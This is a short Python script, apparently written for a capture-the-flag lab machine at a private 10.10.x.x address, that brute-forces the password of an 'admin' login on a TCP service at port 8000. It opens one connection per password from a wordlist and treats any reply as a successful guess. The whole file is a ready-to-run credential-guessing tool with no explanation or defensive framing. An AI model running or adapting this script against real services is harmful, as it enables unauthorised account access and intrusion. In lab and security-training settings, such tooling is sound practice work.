import socket

# Configuration
target_ip = "10.10.188.173"  # Target IP
target_port = 8000        # Target port
password_wordlist = "wordlist.txt"  # Path to your password wordlist file

def connect_and_send_password(password):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))
        client_socket.sendall(b'admin\n')


        response = client_socket.recv(1024).decode()
        print(f"Server response after sending 'admin': {response}")

        if "Password:" in response:
            print(f"Trying password: {password}")
            client_socket.sendall(password.encode() + b"\n")

            response = client_socket.recv(1024).decode()

            if response:
                print(f"Server response for password '{password}': {response}")
                return True
            else:
                print(f"Password '{password}' is incorrect or no response.")

        return False

    except Exception as e:
        print(f"Error: {e}")
        return False

    finally:
        client_socket.close()

def fuzz_passwords():
    with open(password_wordlist, "r") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()  # Remove any newline characters

        if connect_and_send_password(password):
            print(f"Correct password found: {password}")
            break
        else:
            print(f"Password {password} was incorrect. Reconnecting...")

if __name__ == "__main__":
    fuzz_passwords()
